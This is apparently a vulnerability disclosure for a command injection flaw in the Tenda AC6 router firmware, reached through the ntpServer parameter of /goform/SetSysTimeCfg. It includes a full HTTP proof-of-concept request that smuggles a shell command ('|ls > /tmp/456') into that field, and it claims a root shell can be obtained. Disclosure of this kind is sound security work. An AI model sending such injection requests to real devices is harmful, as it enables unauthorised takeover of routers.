# Tenda AC6 V15.03.05.09_multi Command injection vulnerability

## Overview

- Manufacturer's website information：https://www.tenda.com.cn/profile/contact.html
- Firmware download address ： https://www.tenda.com.cn/download/default.html

## 1. Affected version

![image-20220215174142153](img/image-20220215174142153.png)

Figure 1 shows the latest firmware Ba of the router

## 2.Vulnerability details

#### 2.1Command injection vulnerability

![image-20220228162806422](img/image-20220228162806422.png)

The program first passes the contents obtained from the ntpserver parameter to SRC, then sets the SRC value and passes the return value to V1. Finally, the program takes V1 as a parameter through the comitcfm function, which finally causes a command injection vulnerability.

## 3.Recurring vulnerabilities and POC

In order to reproduce the vulnerability, the following steps can be followed:

1. Use the fat simulation firmware V15.03.05.09_multi
2. Attack with the following  overflow POC attacks

```
POST /goform/SetSysTimeCfg HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 69
Origin: http://192.168.1.1
Connection: close
Referer: http://192.168.1.1/system_time.html?random=0.9657222523817097&
Cookie: password=e10adc3949ba59abbe56e057f20f883effo1qw

timePeriod=86400&ntpServer=time.windows.com|ls > /tmp/456&timeZone=20
```

The reproduction results are as follows:

![image-20220228162641056](img/image-20220228162641056.png)

![image-20220228162703168](img/image-20220228162703168.png)

Figure 2 POC attack effect

Finally, you can write exp, which can achieve a very stable effect of obtaining the root shell

![image-20220215180128600](img/image-20220215180128600.png)

